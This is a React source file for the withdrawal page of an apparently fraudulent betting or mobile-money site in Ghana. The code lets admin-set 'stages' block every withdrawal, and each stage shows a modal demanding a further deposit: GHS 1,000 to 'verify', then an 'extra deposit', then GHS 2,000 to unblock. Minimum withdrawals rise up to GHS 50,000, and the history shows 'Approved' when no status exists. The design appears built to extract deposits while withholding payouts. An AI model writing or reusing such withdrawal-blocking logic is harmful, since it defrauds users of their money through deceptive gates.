import { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAccount, useToast } from '../providers/AccountProvider.jsx';
import { fetchTransactions, withdraw } from '../api/betApi.js';
import TxHeader from '../components/TxHeader.jsx';
import PaybillInstructions from '../components/PaybillInstructions.jsx';
import { readTxCache, writeTxCache, mergeTxLists } from '../lib/txCache.js';

function fmt(n) {
  return Number(n || 0).toLocaleString('en-GH', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

function formatTxDate(iso) {
  if (!iso) return '';
  const d = new Date(iso);
  const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
  const day = d.getDate();
  const month = months[d.getMonth()];
  const hrs = String(d.getHours()).padStart(2, '0');
  const mins = String(d.getMinutes()).padStart(2, '0');
  return `${day} ${month} ${hrs}:${mins}`;
}

const NETWORKS = {
  momo:       { label: 'MTN Mobile Money', tag: 'MTN', bg: '#ffcc00' },
  vodafone:   { label: 'Telecel Cash',     tag: 'TLC', bg: '#e60000' },
  airteltigo: { label: 'AT Money',         tag: 'AT',  bg: '#0055ff' },
};

export default function WithdrawPage() {
  const navigate = useNavigate();
  const { account, openDeposit, setAccount } = useAccount();
  const { toast } = useToast();
  const [txs, setTxs] = useState([]);
  const [amount, setAmount] = useState('');
  const [method, setMethod] = useState('momo');
  const [tab, setTab] = useState('momo'); // 'momo' | 'paybill' | 'card'
  const [err, setErr] = useState('');
  const [showDepositReq, setShowDepositReq] = useState(false);     // Stage 1 modal
  const [showExtraDeposit, setShowExtraDeposit] = useState(false); // Stage 2 modal
  const [showBlocked, setShowBlocked] = useState(false);           // Stage 3 (blocked) modal
  const [busy, setBusy] = useState(false);

  const MIN_WITHDRAW_DEFAULT = 550;       // Stage 0, 1
  const STAGE2_MIN_WITHDRAW  = 10_000;    // Stage 2 (also enforces the 10% extra-deposit rule)
  const STAGE3_MIN_WITHDRAW  = 40_000;    // Stage 3
  const STAGE4_MIN_WITHDRAW  = 50_000;    // Stage 4 (VIP)
  const MAX_WITHDRAW         = 95_000;
  const WITHDRAW_DEPOSIT_RATIO = 0.10;
  // Stage gates withdrawal flow. New users start at Stage 0 (see
  // /admin/stages). Stage 0 → Stage 1 is automatic once lifetime deposits
  // reach GHS 1,000; the rest are admin-controlled.
  // Stage 3 + blocked locks the account until an admin unblocks it.
  const stage = (() => {
    const n = Number(account?.stage);
    if (!Number.isFinite(n)) return 0;
    return Math.min(4, Math.max(0, n));
  })();
  const isBlocked = !!account?.blocked;
  // Minimum withdrawal scales with stage. Stage 2 also enforces the 10%
  // extra-deposit credit rule (see Stage 2 popup).
  const MIN_WITHDRAW =
    stage === 2 ? STAGE2_MIN_WITHDRAW :
    stage === 3 ? STAGE3_MIN_WITHDRAW :
    stage === 4 ? STAGE4_MIN_WITHDRAW :
    MIN_WITHDRAW_DEFAULT;

  useEffect(() => {
    if (!account) {
      navigate('/login?next=/withdraw');
      return;
    }
    let alive = true;
    // Prime from local cache so the section is never blank between fetches.
    setTxs((readTxCache(account.id) || []).filter((t) => t.kind === 'withdraw' || t.kind === 'withdrawal'));
    (async () => {
      try {
        const data = await fetchTransactions();
        if (!alive) return;
        const serverList = data.transactions || [];
        const merged = mergeTxLists(serverList, readTxCache(account.id));
        writeTxCache(account.id, merged);
        setTxs(merged.filter((t) => t.kind === 'withdraw' || t.kind === 'withdrawal'));
      } catch {
        /* transactions optional — silent fail OK, cache still in state */
      }
    })();
    return () => { alive = false; };
  }, [account, navigate]);

  if (!account) return null;

  const balance = account.balance ?? 0;
  const totalDeposited = Number(account.totalDeposited || 0);
  const amtNum = parseFloat(String(amount).replace(/,/g, '')) || 0;
  const overBalance = amtNum > balance;
  // The deposit-ratio gate is enforced via the stage popups instead of
  // blocking the button, so the user always reaches the modal that explains
  // *why* the withdrawal can't proceed yet.
  const isAmountValid = amtNum >= MIN_WITHDRAW && amtNum <= MAX_WITHDRAW && !overBalance;
  const net = NETWORKS[method] || NETWORKS.momo;
  const accountPhone = account.phone || account.email || '+233 59****943';

  const bump = (n) => setAmount(String(Math.min(MAX_WITHDRAW, Math.round(amtNum + n))));

  const cycleNetwork = () => {
    const order = ['momo', 'vodafone', 'airteltigo'];
    const nextIdx = (order.indexOf(method) + 1) % order.length;
    setMethod(order[nextIdx]);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setErr('');
    if (!isAmountValid || busy) return;
    // Stage 3 promotes lock the account — the blocked popup gates everything
    // until an admin clears the block.
    if (isBlocked) {
      setShowBlocked(true);
      return;
    }
    if (stage === 0 || stage === 1) {
      // Stage 0 = brand new; Stage 1 = registered but not yet manually
      // verified by an admin. Both gate behind the deposit-requirement modal.
      setShowDepositReq(true);
      return;
    }
    if (stage === 2) {
      setShowExtraDeposit(true);
      return;
    }
    // Stage 3 and not blocked — admin has cleared the lock, allow real
    // withdrawal to go through.
    try {
      setBusy(true);
      const data = await withdraw(amtNum, method);
      if (data.account) setAccount(data.account);
      if (data.transaction) setTxs((cur) => [data.transaction, ...cur].slice(0, 50));
      toast(`Withdrew GHS ${fmt(amtNum)} to ${net.label}.`);
      setAmount('');
    } catch (e2) {
      setErr(e2.message || 'Withdrawal failed.');
    } finally {
      setBusy(false);
    }
  };

  const REQUIRED_DEPOSIT = 1000;
  const goDeposit = () => {
    setShowDepositReq(false);
    setShowExtraDeposit(false);
    setShowBlocked(false);
    openDeposit();
  };
  const goSupport = () => {
    setShowBlocked(false);
    navigate('/help');
  };

  const BLOCKED_DEPOSIT = 2000;

  // Stage 2 modal numbers (match the reference design)
  const extraRequired = Number((amtNum * WITHDRAW_DEPOSIT_RATIO).toFixed(2));
  const extraAvailable = totalDeposited;
  const extraStillNeeded = Math.max(0, Number((extraRequired - extraAvailable).toFixed(2)));

  return (
    <main style={{ minHeight: 'calc(100vh - 120px)', background: 'var(--bg)', padding: '0 0 80px' }}>
      {showDepositReq && (
        <div
          role="dialog"
          aria-modal="true"
          aria-labelledby="deposit-req-title"
          style={{
            position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.55)',
            display: 'flex', alignItems: 'center', justifyContent: 'center',
            padding: 16, zIndex: 1000,
          }}
          onClick={() => setShowDepositReq(false)}
        >
          <div
            onClick={(e) => e.stopPropagation()}
            style={{
              width: '100%', maxWidth: 360, background: '#fff', color: '#111',
              borderRadius: 14, padding: '20px 20px 18px', boxShadow: '0 20px 50px rgba(0,0,0,0.35)',
            }}
          >
            <div style={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between', marginBottom: 10 }}>
              <h2 id="deposit-req-title" style={{ margin: 0, fontSize: 18, fontWeight: 800, color: '#111' }}>
                Deposit requirement
              </h2>
              <button
                type="button"
                aria-label="Close"
                onClick={() => setShowDepositReq(false)}
                style={{
                  width: 28, height: 28, borderRadius: 6, border: '1px solid #e5e7eb',
                  background: '#f3f4f6', color: '#374151', fontSize: 14, fontWeight: 700,
                  cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center',
                }}
              >
                ×
              </button>
            </div>
            <p style={{ margin: '6px 0 12px', fontSize: 14, color: '#374151', lineHeight: 1.5 }}>
              You need to deposit GHS {REQUIRED_DEPOSIT.toLocaleString('en-US')}.00 to your account to verify your account.
            </p>
            <ul style={{ margin: '0 0 16px', paddingLeft: 18, fontSize: 14, color: '#111' }}>
              <li>Required amount: <strong>GHS {REQUIRED_DEPOSIT.toLocaleString('en-US')}.00</strong></li>
            </ul>
            <button
              type="button"
              onClick={goDeposit}
              style={{
                width: '100%', padding: '12px 0', borderRadius: 8, border: 'none',
                background: '#2f6bff', color: '#fff', fontWeight: 800, fontSize: 15,
                cursor: 'pointer',
              }}
            >
              Go to Deposit
            </button>
          </div>
        </div>
      )}

      {showExtraDeposit && (
        <div
          role="dialog"
          aria-modal="true"
          aria-labelledby="extra-deposit-title"
          style={{
            position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.55)',
            display: 'flex', alignItems: 'center', justifyContent: 'center',
            padding: 16, zIndex: 1000,
          }}
          onClick={() => setShowExtraDeposit(false)}
        >
          <div
            onClick={(e) => e.stopPropagation()}
            style={{
              width: '100%', maxWidth: 380, background: '#fff', color: '#111',
              borderRadius: 16, padding: '22px 22px 18px', boxShadow: '0 20px 50px rgba(0,0,0,0.35)',
            }}
          >
            <div style={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between', marginBottom: 12 }}>
              <h2 id="extra-deposit-title" style={{ margin: 0, fontSize: 18, fontWeight: 800, color: '#111' }}>
                Additional deposit required
              </h2>
              <button
                type="button"
                aria-label="Close"
                onClick={() => setShowExtraDeposit(false)}
                style={{
                  width: 28, height: 28, borderRadius: 6, border: 'none',
                  background: 'transparent', color: '#374151', fontSize: 18, fontWeight: 700,
                  cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center',
                }}
              >
                ×
              </button>
            </div>
            <p style={{ margin: '0 0 14px', fontSize: 14, color: '#374151', lineHeight: 1.5 }}>
              You need an extra approved deposit before this withdrawal can be submitted.
            </p>
            <ul style={{ margin: '0 0 18px', paddingLeft: 18, fontSize: 14, color: '#111', lineHeight: 1.7 }}>
              <li>Withdrawal amount: <strong>GHS {fmt(amtNum)}</strong></li>
              <li>Required extra approved deposit: <strong>GHS {fmt(extraRequired)}</strong></li>
              <li>Available approved deposit credit: <strong>GHS {fmt(extraAvailable)}</strong></li>
              <li>Still needed: <strong>GHS {fmt(extraStillNeeded)}</strong></li>
            </ul>
            <button
              type="button"
              onClick={goDeposit}
              style={{
                width: '100%', padding: '13px 0', borderRadius: 8, border: 'none',
                background: '#2f6bff', color: '#fff', fontWeight: 800, fontSize: 15,
                cursor: 'pointer', marginBottom: 8,
              }}
            >
              Go to Deposit
            </button>
            <button
              type="button"
              onClick={() => setShowExtraDeposit(false)}
              style={{
                width: '100%', padding: '11px 0', borderRadius: 8, border: 'none',
                background: 'transparent', color: '#374151', fontWeight: 600, fontSize: 14,
                cursor: 'pointer',
              }}
            >
              Later
            </button>
          </div>
        </div>
      )}

      {showBlocked && (
        <div
          role="dialog"
          aria-modal="true"
          aria-labelledby="blocked-title"
          style={{
            position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.65)',
            display: 'flex', alignItems: 'center', justifyContent: 'center',
            padding: 16, zIndex: 1000,
          }}
          onClick={() => setShowBlocked(false)}
        >
          <div
            onClick={(e) => e.stopPropagation()}
            style={{
              width: '100%', maxWidth: 360, background: '#0f172a', color: '#fff',
              borderRadius: 18, padding: '26px 22px 20px',
              boxShadow: '0 20px 50px rgba(0,0,0,0.55)',
              border: '1px solid rgba(255,255,255,0.06)',
              textAlign: 'center',
            }}
          >
            {/* Lock icon */}
            <div style={{ display: 'flex', justifyContent: 'center', marginBottom: 14 }}>
              <div
                style={{
                  width: 60, height: 60, borderRadius: 14,
                  background: '#1e293b', display: 'grid', placeItems: 'center',
                }}
              >
                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                  <rect x="4" y="11" width="16" height="10" rx="2" fill="#facc15" />
                  <path d="M7 11V8a5 5 0 0 1 10 0v3" stroke="#facc15" strokeWidth="2.4" fill="none" strokeLinecap="round" />
                  <circle cx="12" cy="16" r="1.6" fill="#0f172a" />
                </svg>
              </div>
            </div>
            <h2 id="blocked-title" style={{ margin: 0, fontSize: 20, fontWeight: 800, letterSpacing: '-0.01em' }}>
              account blocked
            </h2>
            <p style={{ margin: '10px 4px 22px', fontSize: 14, color: '#cbd5e1', lineHeight: 1.55 }}>
              your account is blocked. deposit ghs {BLOCKED_DEPOSIT.toLocaleString('en-US')}.00 and contact support for review.
            </p>
            <button
              type="button"
              onClick={goDeposit}
              style={{
                width: '100%', padding: '13px 0', borderRadius: 12, border: 'none',
                background: '#2f6bff', color: '#fff', fontWeight: 800, fontSize: 15,
                cursor: 'pointer', marginBottom: 8,
              }}
            >
              go to deposit
            </button>
            <button
              type="button"
              onClick={goSupport}
              style={{
                width: '100%', padding: '13px 0', borderRadius: 12,
                background: '#1e293b', border: '1px solid rgba(255,255,255,0.08)',
                color: '#fff', fontWeight: 700, fontSize: 14.5,
                cursor: 'pointer', marginBottom: 8,
              }}
            >
              contact support
            </button>
            <button
              type="button"
              onClick={() => setShowBlocked(false)}
              style={{
                width: '100%', padding: '13px 0', borderRadius: 12,
                background: '#1e293b', border: '1px solid rgba(255,255,255,0.08)',
                color: '#fff', fontWeight: 700, fontSize: 14.5,
                cursor: 'pointer',
              }}
            >
              close
            </button>
          </div>
        </div>
      )}

      <div style={{ maxWidth: 480, margin: '0 auto', background: 'var(--bg)' }}>

        <TxHeader title="Withdraw" />

        <div className="tx-tabs">
          {[['momo', 'Mobile Money'], ['paybill', 'Paybill'], ['card', 'Card']].map(([k, lbl]) => (
            <button
              key={k}
              type="button"
              className="tx-tab"
              aria-selected={tab === k}
              onClick={() => setTab(k)}
            >
              {lbl}
            </button>
          ))}
        </div>

        <div style={{ padding: 16 }}>

          {tab === 'momo' && (
            <form onSubmit={handleSubmit}>

              {/* Phone card */}
              <div style={{ background: 'var(--surface)', border: '1px solid var(--line)', borderRadius: 10, padding: '14px 14px', display: 'flex', alignItems: 'center', gap: 12, marginBottom: 12 }}>
                <div style={{ width: 28, height: 28, borderRadius: 6, background: 'var(--surface-2)', display: 'flex', alignItems: 'center', justifyContent: 'center', color: 'var(--text-soft)' }}>
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
                </div>
                <div style={{ fontSize: 15, fontWeight: 600, color: 'var(--text)' }}>{accountPhone}</div>
              </div>

              {/* Network card */}
              <div style={{ background: 'var(--surface)', border: '1px solid var(--line)', borderRadius: 10, padding: '12px 14px', display: 'flex', alignItems: 'center', gap: 12, marginBottom: 16 }}>
                <div style={{ width: 32, height: 32, borderRadius: 6, background: net.bg, color: '#000', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: 900, fontSize: 10, lineHeight: 1 }}>{net.tag}</div>
                <div style={{ flex: 1, fontSize: 15, fontWeight: 700, color: 'var(--text)' }}>{net.label}</div>
                <button
                  type="button"
                  onClick={cycleNetwork}
                  style={{ background: 'transparent', border: 'none', color: 'var(--accent)', cursor: 'pointer', fontSize: 14, fontWeight: 700, display: 'inline-flex', alignItems: 'center', gap: 2 }}
                >
                  Switch <span style={{ fontSize: 13 }}>›</span>
                </button>
              </div>

              {/* Balance row */}
              <div style={{ textAlign: 'right', fontSize: 13, color: 'var(--text-soft)', marginBottom: 6 }}>
                Balance (GHS) {fmt(balance)}
              </div>

              {/* Amount card */}
              <div style={{ background: 'var(--surface)', border: '1px solid var(--line)', borderRadius: 10, padding: '14px 14px', marginBottom: 10 }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 8 }}>
                  <label htmlFor="wd-amt" style={{ fontSize: 15, fontWeight: 700, color: 'var(--text)' }}>Amount (GHS)</label>
                  <span style={{ fontSize: 13, color: 'var(--text-dim)' }}>min. {MIN_WITHDRAW.toLocaleString('en-US')}.00</span>
                </div>
                <input
                  id="wd-amt"
                  type="number"
                  min={MIN_WITHDRAW}
                  max={MAX_WITHDRAW}
                  step="1"
                  inputMode="decimal"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  placeholder={`min. ${MIN_WITHDRAW.toLocaleString('en-US')}`}
                                    autoFocus
                  style={{ width: '100%', background: 'transparent', border: 'none', color: 'var(--text)', fontSize: 24, fontWeight: 800, outline: 'none', padding: 0 }}
                />
              </div>

              {/* Quick chips */}
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6, 1fr)', gap: 6, marginBottom: 16 }}>
                {[10, 50, 100, 500, 1000].map((n) => (
                  <button
                    key={n}
                    type="button"
                    onClick={() => bump(n)}
                    style={{ padding: '12px 0', background: 'var(--surface)', border: '1px solid var(--line)', borderRadius: 8, color: 'var(--text)', fontWeight: 700, fontSize: 14, cursor: 'pointer' }}
                  >
                    +{n}
                  </button>
                ))}
                <button
                  type="button"
                  onClick={() => setAmount(String(Math.min(MAX_WITHDRAW, Math.floor(balance))))}
                  disabled={balance < MIN_WITHDRAW}
                  title={balance < MIN_WITHDRAW ? `Balance below minimum (GHS ${MIN_WITHDRAW.toLocaleString('en-US')})` : 'Withdraw your full balance'}
                  style={{
                    padding: '12px 0',
                    background: balance >= MIN_WITHDRAW
                      ? 'linear-gradient(135deg, var(--accent), #b0e82d)'
                      : 'var(--surface)',
                    border: '1px solid var(--line)',
                    borderRadius: 8,
                    color: balance >= MIN_WITHDRAW ? '#0a0d0c' : 'var(--text-dim)',
                    fontWeight: 800,
                    fontSize: 14,
                    cursor: balance >= MIN_WITHDRAW ? 'pointer' : 'not-allowed',
                    letterSpacing: 0.02,
                  }}
                >
                  Max
                </button>
              </div>

              {overBalance && (
                <div style={{ background: 'rgba(255,77,61,0.08)', border: '1px solid rgba(255,77,61,0.2)', color: 'var(--danger, #ff5d5d)', padding: '10px 14px', borderRadius: 10, fontSize: 12, marginBottom: 12 }}>
                  Insufficient balance — you have GHS {fmt(balance)}.
                </div>
              )}

              {err && (
                <div style={{ background: 'rgba(255,77,61,0.08)', border: '1px solid rgba(255,77,61,0.2)', color: 'var(--danger, #ff5d5d)', padding: '10px 14px', borderRadius: 10, fontSize: 12, marginBottom: 12 }}>
                  {err}
                </div>
              )}

              <button
                type="submit"
                disabled={!isAmountValid || busy}
                style={{
                  width: '100%', padding: '14px 0', borderRadius: 10, border: 'none',
                  background: isAmountValid && !busy ? 'linear-gradient(135deg, var(--accent), #b0e82d)' : 'var(--surface-2)',
                  color: isAmountValid && !busy ? '#0a0d0c' : 'var(--text-dim)',
                  fontWeight: 800, fontSize: 16, cursor: isAmountValid && !busy ? 'pointer' : 'not-allowed', marginBottom: 18,
                }}
              >
                {busy ? 'Processing…' : 'Withdraw Now'}
              </button>

              <ol style={{ paddingLeft: 18, margin: 0, fontSize: 13, color: 'var(--text-soft)', lineHeight: 1.7 }}>
                <li>Maximum transaction is GHS {MAX_WITHDRAW.toLocaleString('en-US')}.00</li>
                <li>Minimum per transaction is GHS {MIN_WITHDRAW.toLocaleString('en-US')}.00{stage === 2 ? ' (Stage 2 minimum)' : ''}</li>
                <li>Withdrawal is free, no fee transaction.</li>
              </ol>
            </form>
          )}

          {tab === 'paybill' && (
            <PaybillInstructions
              paybillId="222000"
              accountRef={accountPhone}
              context="withdraw"
            />
          )}

          {tab === 'card' && (
            <div style={{ padding: '32px 8px', textAlign: 'center', color: 'var(--text-soft)' }}>
              <p style={{ fontWeight: 700, color: 'var(--text)', marginBottom: 8 }}>Card withdrawals unavailable</p>
              <p style={{ fontSize: 13 }}>Switch to Mobile Money to withdraw to your MoMo wallet.</p>
            </div>
          )}

          {/* Recent withdrawals */}
          {tab === 'momo' && (
            <section style={{ marginTop: 24, background: 'var(--surface)', border: '1px solid var(--line)', borderRadius: 12, padding: '16px 14px' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 12 }}>
                <h2 style={{ fontSize: 15, fontWeight: 800, margin: 0, color: 'var(--text)' }}>Recent Withdrawals</h2>
                <button type="button" onClick={() => navigate('/wallet')}
                        style={{ background: 'transparent', border: 'none', color: 'var(--accent)', cursor: 'pointer', fontSize: 12, fontWeight: 700 }}>
                  See more
                </button>
              </div>
              {txs.length === 0 ? (
                <p style={{ fontSize: 13, color: 'var(--text-dim)', textAlign: 'center', padding: '12px 0' }}>No withdrawals yet.</p>
              ) : (
                <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
                  {txs.slice(0, 5).map((t) => (
                    <div key={t.id} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', paddingBottom: 10, borderBottom: '1px solid var(--line)' }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                        <div style={{ width: 32, height: 32, borderRadius: 8, background: 'var(--surface-2)', color: 'var(--text-soft)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><polyline points="19 12 12 19 5 12"/></svg>
                        </div>
                        <div>
                          <div style={{ fontSize: 13, fontWeight: 700, color: 'var(--text)' }}>Withdrawal</div>
                          <div style={{ fontSize: 11, color: 'var(--text-dim)' }}>{t.method ? (NETWORKS[t.method]?.label || t.method) : accountPhone}</div>
                        </div>
                      </div>
                      <div style={{ textAlign: 'right' }}>
                        <div style={{ fontSize: 14, fontWeight: 800, color: 'var(--text)' }}>GHS {fmt(t.amount)}</div>
                        <div style={{ fontSize: 9, fontWeight: 800, color: 'var(--accent)', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
                          {t.status === 'completed' ? 'Approved' : (t.status || 'Approved')}
                        </div>
                        <div style={{ fontSize: 10, color: 'var(--text-dim)' }}>{formatTxDate(t.at || t.createdAt)}</div>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </section>
          )}

        </div>
      </div>
    </main>
  );
}
